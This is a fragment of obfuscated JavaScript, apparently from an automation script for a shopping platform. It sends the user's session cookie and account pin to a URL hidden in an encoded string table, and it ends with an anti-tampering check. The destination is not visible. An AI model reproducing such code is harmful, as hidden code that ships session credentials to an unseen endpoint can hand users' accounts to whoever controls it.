getBodySign(_0x6931x2,_0x6931x3,_0x6931x4,_0x6931x5,_0x6931x6,_0x6931x7){return  new Promise((_0x6931x8)=>{$[__Oxdd755[0xf]]({url:`${__Oxdd755[0x0]}${_0x6931x2}${__Oxdd755[0x1]}${_0x6931x4}${__Oxdd755[0x2]}${_0x6931x5}${__Oxdd755[0x3]}${_0x6931x6}${__Oxdd755[0x4]}${_0x6931x7}${__Oxdd755[0x5]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x70\x74\x5F\x70\x69\x6E":_0x6931x3,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0x6931x9,_0x6931xa,_0x6931xb)=>{try{_0x6931xb= JSON[__Oxdd755[0x6]](_0x6931xb);data1= _0x6931xb[__Oxdd755[0x7]];helpno= _0x6931xb[__Oxdd755[0x8]]+ _0x6931xb[__Oxdd755[0x9]]+ _0x6931xb[__Oxdd755[0xa]]+ _0x6931xb[__Oxdd755[0xb]]+ _0x6931xb[__Oxdd755[0xc]]}catch(e){$[__Oxdd755[0xe]](__Oxdd755[0xd],e)}finally{_0x6931x8(data1)}})})}(function(_0x6931xc,_0x6931xd,_0x6931xe,_0x6931xf,_0x6931x10,_0x6931x11){_0x6931x11= __Oxdd755[0x10];_0x6931xf= function(_0x6931x12){if( typeof alert!== _0x6931x11){alert(_0x6931x12)};if( typeof console!== _0x6931x11){console[__Oxdd755[0x11]](_0x6931x12)}};_0x6931xe= function(_0x6931x13,_0x6931xc){return _0x6931x13+ _0x6931xc};_0x6931x10= _0x6931xe(__Oxdd755[0x12],_0x6931xe(_0x6931xe(__Oxdd755[0x13],__Oxdd755[0x14]),__Oxdd755[0x15]));try{_0x6931xc= __encode;if(!( typeof _0x6931xc!== _0x6931x11&& _0x6931xc=== _0x6931xe(__Oxdd755[0x16],__Oxdd755[0x17]))){_0x6931xf(_0x6931x10)}}catch(e){_0x6931xf(_0x6931x10)}})({})
